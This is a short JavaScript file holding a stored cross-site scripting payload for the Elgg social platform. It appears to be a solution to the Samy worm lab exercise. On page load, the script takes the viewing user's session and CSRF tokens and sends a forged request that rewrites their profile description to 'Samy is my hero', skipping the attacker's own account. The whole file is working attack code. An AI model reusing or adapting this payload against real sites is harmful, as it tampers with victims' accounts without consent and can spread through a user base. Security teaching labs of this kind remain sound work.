"use strict";

/**
 * @param {number} guid
 * @returns {Promise<void>}
 * */
const editProfile = async (guid) => {
  const baseUrl = document.location.origin;
  const path = "/action/profile/edit";
  const url = new URL(path, baseUrl);

  const params = {
    name: elgg.session.user.name,
    guid,
    description: "Samy is my hero",
    "accesslevel[description]": 2,
    __elgg_ts: elgg.security.token.__elgg_ts,
    __elgg_token: elgg.security.token.__elgg_token,
  };

  Object.entries(params).forEach(([key, value]) => {
    url.searchParams.append(key, value);
  });

  try {
    const response = await fetch(url, {
      method: "GET",
      credentials: "include",
    });

    if (!response.ok) {
      throw new Error(`HTTP error! status: ${response.status}`);
    }
  } catch (e) {
    console.error("Failed to edit profile:", e);
  }
};

onload = () => {
  const currentGuid = elgg.session.user.guid;
  if (currentGuid === 59) {
    // Samy's profile, no need to edit.
    return;
  }

  editProfile(currentGuid);
};
